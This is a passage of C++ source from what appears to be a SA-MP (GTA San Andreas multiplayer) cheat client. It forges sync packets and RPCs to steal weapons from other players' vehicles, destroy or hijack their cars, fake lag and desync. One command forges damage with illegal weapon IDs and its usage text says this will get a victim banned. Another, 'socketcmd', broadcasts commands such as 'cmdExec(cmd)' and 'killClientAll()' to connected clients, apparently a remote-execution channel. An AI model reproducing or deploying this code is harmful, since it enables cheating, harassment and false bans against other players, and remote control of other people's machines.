	else addMessageToChatWindow("Target is not in any vehicle");
}


void cmd_attachveh(char* params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /attveh <vehicle id>");

	int vid = atoi(params);

	if (isBadSAMPVehicleID(vid) || !IsVehicleStreamed(vid))
		return addMessageToChatWindow("Vehicle does not exist.");

	vehicle_info* veh = getGTAVehicleFromSAMPVehicleID(vid);

	if (veh == NULL)
	{
		return addMessageToChatWindow("Vehicle not streamed/exists.");
	}

	CVehicle* pVehicle = pPedSelf->GetVehicle();

	if (!pVehicle) return addMessageToChatWindow("You aren't in a vehicle.");

	CVehicle* cveh = pPools->GetVehicle((DWORD*)veh);

	if (!isBadPtr_GTA_pVehicle(pVehicle) && pVehicle!= NULL && !isBadPtr_GTA_pVehicle(cveh) && cveh != NULL)
	{
		cveh->SetTowLink(pVehicle);
	}
	else return addMessageToChatWindow("Invalid current vehicle/s.");

	return;
}

void cmd_lsrpstealguns(char* params)
{
	if (lsrpStealGuns_Working == true) return addMessageToChatWindow("Still working!");

	// MAYBE add a split second of Packet_Onfoot below the car so you can tp and not 'g bug' rly or smth idk
	int vid;
	char forceAdjust[128], forceSuicide[128];
	int ipc = sscanf(params, "%d%s%s", &vid, forceAdjust, forceSuicide);
	if (ipc < 1)
	{
		addMessageToChatWindow("USAGE: /lsrp_stealguns <vehicle id> <force adjust true/false> <respawn true/false>");
		addMessageToChatWindow("{00CCFF}Force adjust is false by default, what it does is /adjustgun and reset gun positions so trunk guns can be stolen too.");
		addMessageToChatWindow("{00CCFF}Force adjust can cause you to take some more time in retrieving the guns as it adjusts but it can increase chances?");
		addMessageToChatWindow("{FFFF00}Respawn is false by default, what it does is kill you afterwards, in LSRP you spawn back with guns.");
		return;
	}

	if (ipc >= 2 && stricmp(forceAdjust, "true") == NULL) lsrpStealGuns_ForceAdjust = true;
	else lsrpStealGuns_ForceAdjust = false;

	if (ipc >= 3 && stricmp(forceSuicide, "true") == NULL) lsrpStealGuns_RespawnAfter = true;
	else lsrpStealGuns_RespawnAfter = false;

	if (isBadSAMPVehicleID(vid) || !IsVehicleStreamed(vid))
		return addMessageToChatWindow("Vehicle does not exist.");

	vehicle_info* veh = getGTAVehicleFromSAMPVehicleID(vid);

	if (veh == NULL)
	{
		return addMessageToChatWindow("Vehicle not streamed/exists.");
	}

	CVehicle* cveh = pPools->GetVehicle((DWORD*)veh);

	if (!isBadPtr_GTA_pVehicle(cveh) && cveh != NULL)
	{
		if (!cveh->IsEngineOn()) return addMessageToChatWindow("Vehicle's engine is off.");

		lsrpStealGuns_ForceAdjust_Waiting = false;
		lsrpStealGuns_Stage = 0;
		lsrpStealGuns_VID = vid;
		lsrpStealGuns_LastAction = GetTickCount();
		lsrpStealGuns_Working = true;

		BitStream bsEnterVeh;
		bsEnterVeh.Write(vid);
		bsEnterVeh.Write((UINT8)1);
		g_RakClient->RPC(RPC_EnterVehicle, &bsEnterVeh);

		stPassengerData data;

		memset(&data, 0, sizeof(stPassengerData));

		data.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTAEntity->armor;
		data.byteCurrentWeapon = 0;
		data.byteHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTAEntity->hitpoints;
		data.byteSeatID = (getVehicleEmptySeat(veh, true) == -1) ? 1 : getVehicleEmptySeat(veh, true);
		data.sVehicleID = vid;
		vect3_copy(&veh->base.matrix[4 * 3], data.fPosition);

		BitStream parameters;
		parameters.Reset();
		parameters.Write((BYTE)ID_PASSENGER_SYNC);
		parameters.Write((PCHAR)&data, sizeof(stPassengerData));
		g_RakClient->Send(&parameters, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
	}
	else return addMessageToChatWindow("Invalid current vehicle/s.");

	return;
}

void cmd_unlockveh(char* params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /unlockveh <vehicle id>");

	int vid = atoi(params);

	if (isBadSAMPVehicleID(vid) || !IsVehicleStreamed(vid))
		return addMessageToChatWindow("Vehicle does not exist.");

	vehicle_info* veh = getGTAVehicleFromSAMPVehicleID(vid);

	if (veh == NULL)
	{
		return addMessageToChatWindow("Vehicle not streamed/exists.");
	}

	CVehicle* cveh = pPools->GetVehicle((DWORD*)veh);

	if (!isBadPtr_GTA_pVehicle(cveh) && cveh != NULL)
	{
		cveh->LockDoors(false);
		cveh->SetScriptLocked(false);
		cveh->SetDoorsUndamageable(false);
		veh->door_status = 1;
	}
	else return addMessageToChatWindow("Invalid current vehicle/s.");

	return;
}

void cmd_destroycar(char* params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /.destroycar <car id>");


	BitStream bsMsg;

	bsMsg.Write(atoi(params));

	g_RakClient->RPC(RPC_VehicleDestroyed, &bsMsg);
	
	return;
}

void DamageVehicleDoor(int vid)
{
	BitStream bsMsg;

	// UINT32 panels, UINT32 doors, UINT8 lights, UINT8 tires

	bsMsg.ResetWritePointer();
	bsMsg.Write(vid);

	bsMsg.Write((UINT32)0);
	//bsMsg.Write(UINT32(0b100 << 8) | (0b100 << 16) | (0b100 << 24) | (0b100 << 32)); // Breaks the bottom right tire + right door
	bsMsg.Write((UINT32)1024); // Should break only the door? Ugh forgetto

	bsMsg.Write((UINT32)0);
	bsMsg.Write((UINT32)0);

	g_RakClient->RPC(RPC_DamageVehicle, &bsMsg); 

	if (isBadSAMPVehicleID(vid) || !IsVehicleStreamed(vid))
		return;

	vehicle_info* veh = getGTAVehicleFromSAMPVehicleID(vid);

	if (veh == NULL)
	{
		return;
	}

	CVehicle* cveh = pPools->GetVehicle((DWORD*)veh);

	if (!isBadPtr_GTA_pVehicle(cveh) && cveh != NULL)
	{
		cveh->GetDamageManager()->SetDoorStatus(eDoors::FRONT_RIGHT_DOOR, 4);
		cveh->GetDamageManager()->SetDoorStatus(eDoors::FRONT_LEFT_DOOR, 4);
	}
	return;
}

void cmd_damagedoors(char* params)
{
	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /damagedoors <car id>");

	DamageVehicleDoor(atoi(params));

	addMessageToChatWindow("{FFFFFF}Broke the {00CCFF}right door{FFFFFF}. Restream (enter & exit) to sync.");
	addMessageToChatWindow("{FFFFFF}In some servers you have to G-Bug or enter the car, exit and then restream for effect.");
}

void cmd_takedmgrpc(char* params)
{
	int iPlayerID;
	int fAmount;
	int iWeaponID;

	int ipc = sscanf(params, "%d%d%d", &iPlayerID, &fAmount, &iWeaponID);
	if (ipc < 3)
	{
		addMessageToChatWindow("/.takedmgrpc [PlayerID] [Amount] [WeaponID]");
		addMessageToChatWindow("Try illegal weapon id's such as 38 to get player banned.");
		return;
	}
	BitStream parameters;

	parameters.Write(true);
	parameters.Write(iPlayerID);
	float amountConv = (float)fAmount * 1.0001F;
	parameters.Write(amountConv);
	parameters.Write(iWeaponID);
	parameters.Write((UINT32)srandom<UINT32>(3, 9));

	g_RakClient->RPC(RPC_GiveTakeDamage, &parameters);
}

void cmd_forcecrash(char* params)
{
	delete g_RakClient;
	delete g_Chat;
	delete g_Input;
	delete g_SAMP;
	*(int*)(g_dwSAMP_Addr) = 65535;
	return;
}

void cmd_carpark(char* params)
{
	int playerID;

	int ipc = sscanf(params, "%d", &playerID);
	if (ipc < 1) return addMessageToChatWindow("USAGE: /.carpark [targetId]");

	if (!ValidPlayer(playerID) || !IsPlayerStreamed(playerID)) return addMessageToChatWindow("Target is not valid or not streamed.");
	if (getPlayerState(playerID) != PLAYER_STATE_ONFOOT) return addMessageToChatWindow("Target is not onfoot.");

	CVehicle* pVehicle = pPedSelf->GetVehicle();

	if (pVehicle)
	{
		int iVehicleID = getVehicleGTAIDFromInterface((DWORD*)pVehicle->GetInterface());

		struct vehicle_info* pVehicleEx = vehicle_info_get(iVehicleID, 0);

		// check that the vehicle is legit
		if (!isBadPtr_GTA_pVehicle(pVehicleEx) && pVehicleEx != NULL)
		{
			float fDimensions[3];
			getVehicleModelInfo(pVehicle->GetModelIndex(), VEHICLE_MODEL_INFO_SIZE, fDimensions);

			float fPosition[3];
			vect3_copy(g_Players->pRemotePlayer[playerID]->pPlayerData->fOnFootPos, fPosition);

			fPosition[2] += ((fDimensions[2] <= -0.1 ? -fDimensions[2] : fDimensions[2])) + 3.0;

			// COORDINATE/DIMENSION TWEAKS/FIXES:

			if (pVehicle->GetModelIndex() == 406) // DUMPER:
				fPosition[2] += 1.35;

			cheat_teleport(fPosition, 0);

			addMessageToChatWindow("{FF6347}[Car Park] {FFFFFF}Car parked onto victim..");
		}
		else addMessageToChatWindow("Bad vehicle 0x1 / Not driving a vehicle.");
	}
	else
	{
		addMessageToChatWindow("You aren't driving a vehicle.");
	}

	return;
}

void cmd_gethere(char* params)
{
	int playerID;

	int ipc = sscanf(params, "%d", &playerID);
	if (ipc < 1) return addMessageToChatWindow("USAGE: /.gethere [targetId]");

	if (!ValidPlayer(playerID) || !IsPlayerStreamed(playerID)) return addMessageToChatWindow("Target is not valid or not streamed.");
	if (getPlayerState(playerID) != PLAYER_STATE_ONFOOT) return addMessageToChatWindow("Target is not onfoot.");

	CVehicle* pVehicle = pPedSelf->GetVehicle();
	
	if (pVehicle)
	{
		int iVehicleID = getVehicleGTAIDFromInterface((DWORD*)pVehicle->GetInterface());

		struct vehicle_info* pVehicleEx = vehicle_info_get(iVehicleID, 0);

		// check that the vehicle is legit
		if (!isBadPtr_GTA_pVehicle(pVehicleEx) && pVehicleEx != NULL)
		{
			HookedRakClientInterface* intfc = (HookedRakClientInterface*)g_SAMP->pRakClientInterface;
		
			getHereRelease = GetTickCount() + (g_Players->pRemotePlayer[playerID]->iPing + intfc->GetLastPing() + 50);

			int vid = getSAMPVehicleIDFromGTAVehicle(pVehicleEx);

			float fDimensions[3];
			getVehicleModelInfo(pVehicle->GetModelIndex(), VEHICLE_MODEL_INFO_SIZE, fDimensions);

			stInCarData data = g_Players->pLocalPlayer->inCarData;
			vect3_copy(g_Players->pRemotePlayer[playerID]->pPlayerData->fOnFootPos, data.fPosition);
			
			data.fPosition[2] -= ( (fDimensions[2] <= -0.1 ? -fDimensions[2] : fDimensions[2]) );

			// COORDINATE/DIMENSION TWEAKS/FIXES:

			if (pVehicle->GetModelIndex() == 406) // DUMPER:
				data.fPosition[2] += 1.35;
				
			BitStream bsVehicleSync;
			bsVehicleSync.Write((BYTE)ID_VEHICLE_SYNC);
			bsVehicleSync.Write((PCHAR)&data, sizeof(stInCarData));

			g_RakClient->Send(&bsVehicleSync);

			addMessageToChatWindow("{FF6347}[GetHere] {FFFFFF}Operation pending with lag compensations...");
		}
		else addMessageToChatWindow("Bad vehicle 0x1 / Not driving a vehicle.");
	}
	else
	{
		addMessageToChatWindow("You aren't driving a vehicle.");
	}

	return;
}

void cmd_pmall(char* param)
{
	traceLastFunc("cmd_pmall()");

	char	cmd[32], msg[128];

	int ipc = sscanf(param, "%s %[^\t\n]", cmd, msg);
	if (ipc < 2)
	{
		addMessageToChatWindow("USAGE: /.pmall [cmd (/pm)] [msg]");
		return;
	}
	
	for (int i = 0; i < SAMP_MAX_PLAYERS; i++)
	{
		if (!ValidPlayer(i)) continue;

		say("%s %d %s", cmd, i, msg);
	}
}

void backTrackSetVehicle(CVehicle* veh, CMatrix mat, CVector vecMoveSpeed)
{
	traceLastFunc("backTrackSetVehicle()");

	Sleep(200);

	veh->SetMatrix(&mat);
	veh->SetMoveSpeed(&vecMoveSpeed);
	return;
}

void cheat_handle_fakesynclag()
{
	traceLastFunc("cheat_handle_fakesynclag()");

	if (!set.fakesynclag)
	{
		if (LagQueuePrc.size_approx() > 0)
		{
			moodycamel::ConcurrentQueue<LagQueueData> EmptyQueue;
			LagQueuePrc.swap(EmptyQueue);
		}
		
		return;
	}
	
	std::vector<LagQueueData> eBackPush;

	if (!set.noBigHacks || !isCheatPanicEnabled())
	{
		if(pPedSelf != NULL && fakeLagLastPosTick >= GetTickCount())
		{
			CVector cPos;
			pPedSelf->GetBonePosition(BONE_SPINE1, &cPos);

			float fHeadPos[3] = { D3DXVECTOR3(CVecToD3DXVEC(cPos)).x, D3DXVECTOR3(CVecToD3DXVEC(cPos)).y, D3DXVECTOR3(CVecToD3DXVEC(cPos)).z };

			D3DXVECTOR3 poss, screenposs;
			CVector2D screenHeadPosition, screenLagAreaPosition;
			poss.x = fHeadPos[0];
			poss.y = fHeadPos[1];
			poss.z = fHeadPos[2];
			CalcScreenCoors(&poss, &screenposs);

			screenHeadPosition.fX = screenposs.x;
			screenHeadPosition.fY = screenposs.y;

			poss.x = fakeLagLastPos[0];
			poss.y = fakeLagLastPos[1];
			poss.z = fakeLagLastPos[2];
			CalcScreenCoors(&poss, &screenposs);

			screenLagAreaPosition.fX = screenposs.x;
			screenLagAreaPosition.fY = screenposs.y;

			if (screenposs.z > 1.f)
			{
				render->D3DLineOutlined(screenHeadPosition.fX,
					screenHeadPosition.fY,
					screenLagAreaPosition.fX,
					screenLagAreaPosition.fY,
					2.0,
					D3DCOLOR_XRGB(192, 0, 0), D3DCOLOR_XRGB(0, 0, 0));

				render->CircleOutlined(screenLagAreaPosition.fX - 2,
					screenLagAreaPosition.fY - 2, 10, 56, 2.0, D3DCOLOR_XRGB(192, 0, 0), D3DCOLOR_XRGB(0, 0, 0));

				char sBuf[128] = { 0 };

				if (fakeLagBTTLeft == 0.5)
				{
					sprintf(sBuf, "You appear at this area for others. (Hold BACKSPACE to backtrack)");
				}
				else
				{
					if (fakeLagBTTLeft <= -1.0)
						sprintf(sBuf, "Backtracked! Release BACKSPACE.");
					else
						sprintf(sBuf, "Backtracking in %0.1fs...", fakeLagBTTLeft);
				}
					
				pD3DFont->PrintShadow(screenHeadPosition.fX - (pD3DFont->DrawLength(sBuf) / 2),
					screenHeadPosition.fY - 5,
					D3DCOLOR_RGBA(255, 255, 255, 224), sBuf);
			}
			else
			{
				pD3DFont->PrintShadow(screenHeadPosition.fX - 10,
					screenHeadPosition.fY - 5,
					D3DCOLOR_RGBA(255, 255, 255, 92), "Backtrack vision blocked, look back to view.");
			}

			if (!g_iCursorEnabled && !g_Input->iInputEnabled && KEY_DOWN(VK_BACK))
			{
				if (GetTickCount() >= fakeLagHoldTime + 50)
				{
					fakeLagBTTLeft -= 0.05;
					fakeLagHoldTime = GetTickCount();
				}

				if (fakeLagBTTLeft <= 0.0 && fakeLagBTTLeft > -1.0)
				{
					moodycamel::ConcurrentQueue<LagQueueData> EmptyQueue;
					LagQueuePrc.swap(EmptyQueue);

					if (pPedSelf == NULL) return addMessageToChatWindow("Your ped/character doesn't exist, it's too late.");

					fakeLagBTTLeft = -1.0;
					fakeLagHoldTime = GetTickCount();

					if (lastLagData.type == LAGQUEUETYPE::ONFOOTDATA)
					{
						pPedSelf->SetArmor((float)lastLagData.onfoot.byteArmor);
						pPedSelf->SetHealth((float)lastLagData.onfoot.byteHealth);

						pPedSelf->SetCurrentWeaponSlot(getWeaponSlot(lastLagData.onfoot.byteCurrentWeapon));

						pPedSelf->SetMatrix(&lastLagData.matrix);
						pPedSelf->SetPosition(&lastLagData.position);
						pPedSelf->SetMoveSpeed(&lastLagData.movespeed);
					}
					else if (lastLagData.type == LAGQUEUETYPE::CARDATA)
					{
						if(pPedSelf->GetVehicle() == NULL) return addMessageToChatWindow("Your not in the vehicle to backtrack, it's too late.");

						pPedSelf->SetArmor((float)lastLagData.incar.byteArmor);
						pPedSelf->SetHealth((float)lastLagData.incar.bytePlayerHealth);

						pPedSelf->SetCurrentWeaponSlot(getWeaponSlot(lastLagData.incar.byteCurrentWeapon));

						CVector zero;
						zero.fX = 0.0;
						zero.fY = 0.0;
						zero.fZ = 0.0;
						lastLagData.position.fZ += 0.25;

						pPedSelf->GetVehicle()->SetMoveSpeed(&zero);
						pPedSelf->GetVehicle()->SetMatrix(&lastLagData.matrix);
						pPedSelf->GetVehicle()->SetPosition(&lastLagData.position);
						
						std::thread(backTrackSetVehicle, pPedSelf->GetVehicle(), lastLagData.matrix, lastLagData.movespeed).detach();

						pPedSelf->GetVehicle()->SetHealth(lastLagData.incar.fVehicleHealth);
					}
					else
					{
						addMessageToChatWindow("Failed to backtrack! Backtrack record error?!");
					}
				}
			}
			else
			{
				fakeLagHoldTime = GetTickCount();
				fakeLagBTTLeft = 0.5;
			}
		}
	}

	while (true)
	{
		LagQueueData q;
		bool found = LagQueuePrc.try_dequeue(q);

		if (found)
		{
			if (GetTickCount() >= q.executeTick)
			{
				if (q.type == LAGQUEUETYPE::CARDATA)
				{
					BitStream bsData;

					bsData.Write((BYTE)ID_VEHICLE_SYNC);
					bsData.Write((PCHAR)&q.incar, sizeof(stInCarData));

					vect3_copy(q.incar.fPosition, fakeLagLastPos);
					fakeLagLastPosTick = GetTickCount() + 1000;

					lastLagData = q;

					g_RakClient->Send(&bsData);

				}
				if (q.type == LAGQUEUETYPE::ONFOOTDATA)
				{
					BitStream bsData;

					bsData.Write((BYTE)ID_PLAYER_SYNC);
					bsData.Write((PCHAR)&q.onfoot, sizeof(stOnFootData));

					vect3_copy(q.onfoot.fPosition, fakeLagLastPos);
					fakeLagLastPosTick = GetTickCount() + 1000;

					lastLagData = q;

					g_RakClient->Send(&bsData);
				}
			}
			else {
				if (q.executeTick != 0 && q.type != LAGQUEUETYPE::NONE) eBackPush.push_back(q);
			}
		}
		else break;
	}

	moodycamel::ConcurrentQueue<LagQueueData> EmptyQueue;
	LagQueuePrc.swap(EmptyQueue);

	for (auto &i : eBackPush)
	{
		LagQueuePrc.enqueue(i);
	}


	return;
}

void cheat_handle_forcedesync()
{
	if(forceDesync) g_Players->pLocalPlayer->pSAMP_Actor->drunkLevel = 0;
	return;
}

void cmd_desync(char* params)
{
	forceDesync = !forceDesync;
	addMessageToChatWindow("{FFFF00}Desync Status: {FFFFFF}%d", forceDesync);
	return;
}

void cmd_unfreezeme(char* params)
{
	GTAfunc_TogglePlayerControllable(false);
	return;
}

void DisableNoCols(DWORD time)
{
	Sleep(time);
	cheat_state->_generic.nocols_enabled = 0;
	return;
}

void carControlSetVehicle(CVehicle* veh, CVector vecMoveSpeed, CMatrix vMatrix, float vX, float vY, float vZ)
{
	traceLastFunc("carControlSetVehicle()");

	Sleep(100);
	veh->SetMatrix(&vMatrix);
	veh->SetPosition(vX, vY, vZ);

	veh->SetMoveSpeed(&vecMoveSpeed);
	return;
}

void ccAgainWait(char* params)
{
	Sleep(500);
	cmd_cc(params);
	return;
}

void carControlResetOnfootMode(DWORD wait)
{
	Sleep(wait);

	GTAfunc_RemoveActorFromCarAndPutAt(carControl_LastPos);
	cheat_actor_teleport(actor_info_get(ACTOR_SELF, 0), carControl_LastPos, 0);

	pGameInterface->GetCamera()->Restore();
	pGameInterface->GetCamera()->RestoreWithJumpCut();

	carControl_UsedOnfoot = false;

	if(wait != 500) addMessageToChatWindow("Failed to enter with onfoot carcontrol mode or some error occured. Resetting.");
	return;
}

void cmd_cc(char* params)
{
	if (carControl_LastVeh != NULL)
	{
		GTAfunc_RemoveActorFromCarAndPutAt(carControl_LastPos);

		struct vehicle_info* vehid = getGTAVehicleFromSAMPVehicleIDEx(carControl_LastVeh);

		if (vehid != NULL && ValidVehicle(carControl_LastVeh) && carControl_UsedOnfoot == false)
		{
			if (carControl_LastVehSeat == 0)
				GTAfunc_PutActorInCar(vehid);
			else
				GTAfunc_PutActorInCarAsPassenger(vehid, getVehicleEmptySeat(vehid, true));
		}
		else
		{
			cheat_actor_teleport(actor_info_get(ACTOR_SELF, 0), carControl_LastPos, 0);
		}

		pGameInterface->GetCamera()->Restore();
		pGameInterface->GetCamera()->RestoreWithJumpCut();

		carControl_LastVeh = NULL;

		if (carControl_UsedOnfoot == true) {
			std::thread(carControlResetOnfootMode, 500).detach();
		}

		carControl_UsedOnfoot = false;

		return;
	}

	if (params[0] == '\0')
		return addMessageToChatWindow("USAGE: /.cc <player id>");

	int playerid = atoi(params);

	if (isBadSAMPPlayerID(playerid) || g_Players->iIsListed[playerid] != 1)
		return addMessageToChatWindow("Player does not exist.");

	if (pPedSelf == NULL)
		return addMessageToChatWindow("Local actor does not exist?!");

	actor_info* actor = nullptr;

	if (
		g_Players->pRemotePlayer[playerid]->pPlayerData == nullptr ||
		g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor == nullptr ||
		(actor = g_Players->pRemotePlayer[playerid]->pPlayerData->pSAMP_Actor->pGTA_Ped) == nullptr)
	{
		if (carControl_UsedOnfoot == true)
		{
			carControlResetOnfootMode(0);
		}
		return addMessageToChatWindow("Player not streamed/exists.");
	}

	if (pPedSelf->GetVehicle() == NULL)
	{
		if (carControl_UsedOnfoot == true)
		{
			return carControlResetOnfootMode(0);
		}

		int vid = getNearestEmptyVehicleID(10.0);

		struct vehicle_info* vinfo = getGTAVehicleFromSAMPVehicleIDEx(vid);

		if (vid == 65535 || vinfo == NULL)
			return addMessageToChatWindow("Cannot find a empty vehicle to use carcontrol onfoot.");

		carControl_LastPos[0] = pPedSelf->GetPosition()->fX;
		carControl_LastPos[1] = pPedSelf->GetPosition()->fY;
		carControl_LastPos[2] = pPedSelf->GetPosition()->fZ;

		BitStream bsEnterVeh;
		bsEnterVeh.Write(vid);
		bsEnterVeh.Write((UINT8)1);
		g_RakClient->RPC(RPC_EnterVehicle, &bsEnterVeh);

		stPassengerData data;

		memset(&data, 0, sizeof(stPassengerData));

		data.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTAEntity->armor;
		data.byteCurrentWeapon = 0;
		data.byteHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTAEntity->hitpoints;
		data.byteSeatID = getVehicleEmptySeat(vinfo, true);
		data.sVehicleID = vid;
		vect3_copy(&vinfo->base.matrix[4 * 3], data.fPosition);

		BitStream parameters;
		parameters.Reset();
		parameters.Write((BYTE)ID_PASSENGER_SYNC);
		parameters.Write((PCHAR)&data, sizeof(stPassengerData));
		g_RakClient->Send(&parameters, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

		GTAfunc_PutActorInCarAsPassenger(vinfo, getVehicleEmptySeat(vinfo, true));
		
		carControl_UsedOnfoot = true;

		std::thread(ccAgainWait, params).detach();
		return;
	}

	if (getPlayerState(playerid) == PLAYER_STATE_DRIVER || getPlayerState(playerid) == PLAYER_STATE_PASSENGER)
	{
		carControl_LastVeh = getSAMPVehicleIDFromGTAVehicleEx(
			vehicle_info_get(
				getVehicleGTAIDFromInterface(
				(DWORD*)pPedSelf->GetVehicle()->GetInterface()
				), 0)
		);

		int playerVID = getPlayerSAMPVehicleID(playerid);

		struct vehicle_info* vinfo = getGTAVehicleFromSAMPVehicleIDEx(playerVID);

		if (vinfo == NULL)
		{
			if (carControl_UsedOnfoot == true)
			{
				carControlResetOnfootMode(0);
			}
			return addMessageToChatWindow("Target's vehicle handle is invalid.");
		}

		if (!cheat_state->_generic.nocols_enabled)
		{
			cheat_state->_generic.nocols_enabled = 1;
			std::thread(DisableNoCols, 1500).detach();
		}

		carControl_LastVehSeat = pPedSelf->GetVehicle()->GetDriver() != pPedSelf ? 1 : 0;

		if (carControl_UsedOnfoot == false)
		{
			carControl_LastPos[0] = pPedSelf->GetPosition()->fX;
			carControl_LastPos[1] = pPedSelf->GetPosition()->fY;
			carControl_LastPos[2] = pPedSelf->GetPosition()->fZ;
		}

		CVehicle* cveh = pPools->GetVehicle((DWORD*)vinfo);

		CVector vecMoveSpeed; 
		CMatrix vMatrix;
		cveh->GetMoveSpeed(&vecMoveSpeed);
		cveh->GetMatrix(&vMatrix);
		CVector* vecPos = cveh->GetPosition();

		addMessageToChatWindow("{00FF33}Target Vehicle {FFFFFF}[%d] {00FF33}Current Vehicle {FFFFFF}[%d] {00FF33}Old Seat {FFFFFF}[%d]", playerVID, carControl_LastVeh, carControl_LastVehSeat);

		GTAfunc_PutActorInCar(vinfo);
		GTAfunc_CameraOnVehicle(vinfo, 2);

		std::thread(carControlSetVehicle, cveh, vecMoveSpeed, vMatrix, vecPos->fX, vecPos->fY, vecPos->fZ).detach();
	}
	else
	{
		addMessageToChatWindow("Target is not in any vehicle");
		if (carControl_UsedOnfoot == true)
		{
			carControlResetOnfootMode(0);
		}
	}

	return;
}

void cmd_cmdsocket(char* param)
{
	traceLastFunc("cmd_cmdsocket()");

	if (param[0] == '\0') return addMessageToChatWindow("Must have a command! possible: updateAll(), killClientAll(), cmdExec(cmd)");

	if (socketState != 1) return addMessageToChatWindow("Not socket state 1!");

	for each(auto &i in socketClients)
	{
		try {
			i->SendLine(param);
		}
		catch (...) {}
	}

	addMessageToChatWindow("Sent %s to all.", param);
	return;
}
void cmd_socketstate(char* param)
{
	traceLastFunc("cmd_socketstate()");

	socketState++;
	if (socketState == 3)
		socketState = 0;

	addMessageToChatWindow("[SOCKET STATE] Set to %d", socketState);
	return;
}
void initChatCmds(void)
{
	if (g_m0dCommands == true)
		return;

	cheat_state_text("initiated modcommands");
	g_m0dCommands = true;


	addClientCommand("fuego_cmds", cmd_showCMDS);
	addClientCommand("change_server", cmd_change_server);
	addClientCommand("fav_server", cmd_change_server_fav);
	addClientCommand("current_server", cmd_current_server);
	addClientCommand("tele_loc", cmd_tele_loc);
	addClientCommand("teleport_location", cmd_tele_loc);
	addClientCommand("tele_locations", cmd_tele_locations);
	addClientCommand("teleport_locations", cmd_tele_locations);
	addClientCommand("pickupid", cmd_pickupid);
	addClientCommand("setclass", cmd_setclass);
	addClientCommand("fakekill", cmd_fakekill);
	addClientCommand("warp", cmd_warp);
	addClientCommand("fuckup", cmd_fuckup);
	addClientCommand("fr", cmd_freezetroll);
	addClientCommand("frstop", cmd_freezestop);
	addClientCommand("shotrepeater", cmd_shotrepeater);
	addClientCommand("dualshot", cmd_dualshot);
	addClientCommand("dsdelay", cmd_dualshot_delay);
	addClientCommand("autouns", cmd_autounscrambler);
	addClientCommand("autouns_reload", cmd_autounscrambler_reload);
	addClientCommand("autouns_delay", cmd_autounscrambler_delay);
	addClientCommand("wordlist_add", cmd_wordlist_add);
	addClientCommand("switchwep", cmd_switchwep);
	addClientCommand("friendlist_reload", cmd_friendlist_reload);
	addClientCommand("friendlist_add", cmd_friendlist_add);
	addClientCommand("friendlist_remove", cmd_friendlist_remove);
	addClientCommand("gmammo", cmd_gmammo);
	addClientCommand("toggle_big_hacks", cmd_togglebighacks);
	addClientCommand("fpslimiter", cmd_fpslimiter);
	addClientCommand(".destroyallcars", cmd_destroyallcars);
	addClientCommand(".destroycar", cmd_destroycar);
	addClientCommand("pveh", cmd_playervehicle);
	addClientCommand("itroll", cmd_itroll);
	addClientCommand(".takedmgrpc", cmd_takedmgrpc);
	addClientCommand("forcecrash", cmd_forcecrash);
	addClientCommand("damagedoors", cmd_damagedoors);
	addClientCommand("slapkill", cmd_slapkill);
	addClientCommand(".gethere", cmd_gethere);
	addClientCommand(".pmall", cmd_pmall);
	addClientCommand(".desync", cmd_desync);
	addClientCommand(".unfreezeme", cmd_unfreezeme);
	addClientCommand(".cc", cmd_cc);
	addClientCommand(".carcontrol", cmd_cc);
	addClientCommand(".carpark", cmd_carpark);
	addClientCommand(".cp", cmd_carpark);
	addClientCommand("socketstate", cmd_socketstate, true);
	addClientCommand("socketcmd", cmd_cmdsocket, true);
	addClientCommand("attveh", cmd_attachveh);
	addClientCommand("unlockveh", cmd_unlockveh);
	addClientCommand("lsrp_stealguns", cmd_lsrpstealguns);
	addClientCommand("pweps", cmd_pweps);

}

void SendFakeDriverFullSyncData(stInCarData *picSync, int iUseCarPos)
{
	if (picSync == NULL)
		return;

	if (cheat_state->state != CHEAT_STATE_VEHICLE)
	{
		BitStream bsEnterVeh;
		bsEnterVeh.Write(picSync->sVehicleID);
		bsEnterVeh.Write((UINT8)0);
		g_RakClient->RPC(RPC_EnterVehicle, &bsEnterVeh);
	}

	BitStream bsVehicleSync;

	if (iUseCarPos)
	{
		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[picSync->sVehicleID]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info *vinfo = vehicle_info_get(car_id, 0);

		if (!vinfo)
			return;

		float fPos[3];
		vect3_copy(&vinfo->base.matrix[4 * 3], fPos);

		picSync->fPosition[0] = fPos[0];
		picSync->fPosition[1] = fPos[1];
		picSync->fPosition[2] = fPos[2];
	}

	bsVehicleSync.Write((BYTE)ID_VEHICLE_SYNC);
	bsVehicleSync.Write((PCHAR)picSync, sizeof(stInCarData));

	g_RakClient->Send(&bsVehicleSync);
}

void SendFakeDriverSyncData(int iSAMPVehicleID, float fVehiclePos[3], float fVehicleHealth, float fMoveSpeed[3], float fQuaternion[4] = { 0 })
{
	stInCarData InCarData;
	BitStream bsInCarData;

	struct actor_info *pSelfActor = actor_info_get(ACTOR_SELF, 0);

	InCarData.sVehicleID = iSAMPVehicleID;
	InCarData.fMoveSpeed[0] = fMoveSpeed[0];
	InCarData.fMoveSpeed[1] = fMoveSpeed[1];
	InCarData.fMoveSpeed[2] = fMoveSpeed[2];
	InCarData.fPosition[0] = fVehiclePos[0];
	InCarData.fPosition[1] = fVehiclePos[1];
	InCarData.fPosition[2] = fVehiclePos[2];
	vect4_copy(fQuaternion, InCarData.fQuaternion);
	InCarData.fVehicleHealth = fVehicleHealth;
	InCarData.bytePlayerHealth = (BYTE)pSelfActor->hitpoints;
	InCarData.byteArmor = (BYTE)pSelfActor->armor;

	if (cheat_state->state == CHEAT_STATE_VEHICLE)
		InCarData.byteCurrentWeapon = g_Players->pLocalPlayer->inCarData.byteCurrentWeapon;

	else if (cheat_state->state == CHEAT_STATE_ACTOR)
		InCarData.byteCurrentWeapon = g_Players->pLocalPlayer->onFootData.byteCurrentWeapon;

	else InCarData.byteCurrentWeapon = 0;

	bsInCarData.Write((BYTE)ID_VEHICLE_SYNC);
